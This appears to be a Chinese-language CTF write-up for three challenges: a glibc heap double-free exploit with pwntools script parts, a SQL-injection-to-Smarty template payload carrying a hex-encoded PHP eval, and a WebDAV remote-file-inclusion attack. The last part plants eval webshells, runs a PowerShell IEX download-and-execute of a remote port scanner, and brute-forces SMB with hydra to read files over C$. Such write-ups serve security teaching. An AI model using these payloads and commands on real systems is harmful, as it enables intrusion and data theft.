### 优化后的文本

#### 堆溢出漏洞利用分析

在解决这个题目时，我们发现仅有 `add` 和 `dele` 功能可用。其中 `dele` 没有清空指针，但由于存在 `check` 函数，使得操作变得复杂。此外，`add` 只能执行18次。经过长时间的思考，在最后几个小时尝试了功能3（退出函数），发现报错（堆块重叠导致错误），具体错误为 `malloc_consolidate`。

```c
void init_()
{
  void *ptr; // ST08_8
  setbuf(stdout, 0LL);
  setbuf(stderr, 0LL);
  alarm(0x1Eu);
  ptr = malloc(0x1000uLL);
  printf("good present for African friends:0x%x\n", (unsigned int)(((unsigned __int16)ptr & 0xFF00) >> 8));
  free(ptr);
}
```

这里初始化没有设置 `setbuf(stdin, 0)`，因此在调用 `getchar` 时会在堆上申请一个大小为 `0x1000` 的缓冲区。这样就不需要浪费 `add` 的次数来申请大堆块。结合题目的 `dele` 函数，可以在限定次数内完成利用。

首先执行以下操作：

```python
for i in range(8):
    add(0x78, "\x00" * 0x78)
for i in range(7):
    dele(i)
dele(7)  # fastbin
cmd(3)
p.recvuntil("sure?")
p.send("0")
```

这会使 `chunk7` 被 `malloc_consolidate` 合并。然后执行 `add(0x68, "\x00" * 0x68)` 以防止释放缓冲区时与 `top_chunk` 合并。

通过调试可以看到 `chunk7` 和 `getchar` 申请的缓冲区重叠。我们可以利用 `getchar` 修改 `chunk7` 的 `bk` 指针，从而实现 **double free**。

```python
dele(7)
add(0x68, "\x00" * 0x68)
dele(7)
cmd(3)
p.recvuntil("sure?")
p.send("\x00" * 0xe)
dele(7)
```

成功触发 **double free** 后，堆上会有 `libc` 的指针。

```plaintext
tcachebins
0x70 [2]: 0x55e3221f45e0 ◂— 0x55e3221f45e0
0x80 [7]: 0x55e3221f4560 —▸ 0x55e3221f44e0 —▸ 0x55e3221f4460 —▸ 0x55e3221f43e0 —▸ 0x55e3221f4360 —▸ 0x55e3221f42e0 —▸ 0x55e3221f4260 ◂— 0x0
unsortedbin
all: 0x55e3221f4640 —▸ 0x7f6ba8af9ca0 (main_arena+96) ◂— 0x55e3221f4640
```

后续步骤是泄露 `libc` 并获取 shell。需要注意 `add` 的次数。泄露 `libc` 时有一定的运气成分，但多尝试几次即可成功。

以下是完整的利用脚本：

```python
from pwn import *

def cmd(c):
    p.recvuntil("3.exit")
    p.sendline(str(c))

def add(sz, content):
    cmd(1)
    p.recvuntil("size:")
    p.sendline(str(sz))
    p.recvuntil("content:")
    p.send(content)

def dele(idx):
    cmd(2)
    p.recvuntil("index:")
    p.sendline(str(idx))

def main(host, port=20508):
    global p
    if host:
        p = remote(host, port)
    else:
        p = process("./new_heap", env={"LD_PRELOAD": "./libc.so.6"})
        gdb.attach(p)
    p.recvuntil("friends:")
    heap = (int(p.recvuntil("\n", drop=True), 16) >> 4)
```

#### easyweb 题目分析

该题目提供了一个简洁的登录注册界面，并有一个上传功能，文件直接保存在 `/tmp` 目录下，且过滤了 `..`。Profile 页面显示用户名，可能存在二次注入。渲染引擎使用的是 Smarty。

提示信息：
> Hi, wywwzjj, hope you have a good experience in this ctf game  
> you must get a RCE Bug in this challenge

注册时用户名和密码未经处理，取出来时有简单过滤，很容易绕过。

```sql
jkl2' uni{on se{lect 233#
```

由于 `{}` 被过滤，模板注入较难实现。既然可以执行 SQL，不妨利用一下：

```sql
uni{on sel{lect 0x7b7b7068707d7d6576616c28245f4745545b315d293b7b7b2f7068707d7d#
```

#### fakeonelinephp 题目分析

初步尝试：

```plaintext
Warning: include(): data:// wrapper is disabled in the server configuration by allow_url_include=0 in C:\Users\w1nd\Desktop\web\nginx-1.17.6\html\index.php on line 1
Warning: include(data://...@<?php): failed to open stream: no suitable wrapper could be found in C:\Users\w1nd\Desktop\web\nginx-1.17.6\html\index.php on line 1
Warning: include(): Failed opening 'data://...@<?php' for inclusion (include_path='.;C:\Users\Public\Videos;\c:\php\includes;c:\php\pear;') in C:\Users\w1nd\Desktop\web\nginx-1.17.6\html\index.php on line 1
```

扫描目录发现 `.git` 和 `/webdav`，想起有人提到过使用 webdav 进行 RFI 攻击的方法。

```bash
docker run -v ~/webdav:/var/lib/dav -e ANONYMOUS_METHODS=GET,OPTIONS,PROPFIND -e LOCATION=/webdav -p 80:80 --rm --name webdav bytemark/webdav
```

此时已可实现 RCE，但 flag 仍在内部。

系统信息：
```plaintext
Windows NT 172_19_97_4 10.0 build 14393 (Windows Server 2016) AMD64
```

包含 shell 时遇到一些麻烦，可能是 Defender 等安全软件的干扰。尝试以下方法：

```php
@<?php eval($_POST{1});
@<?php eval(base64_decode(编码一个eval));
```

使用 PowerShell 进行端口扫描：

```powershell
powershell IEX (New-Object System.Net.Webclient).DownloadString('http://vps/Invoke-Portscan.ps1');Invoke-Portscan -Hosts 172.19.97.8
```

扫描结果：

```plaintext
Hostname      : 172.19.97.8
alive         : True
openPorts     : {3389, 445, 139, 135}
closedPorts   : {443, 23, 646, 3306...}
filteredPorts : {80}
finishTime    : 11/24/2019 11:48:02 AM
```

队友尝试爆破 3389 未成功，最终使用 `hydra` 爆破 445 成功。

结合之前的提示，利用 SMB 获取 flag：

```bash
net use \\172.19.97.8\C$
type \\172.19.97.8\C$\Users\Administrator\Desktop\flag.txt
```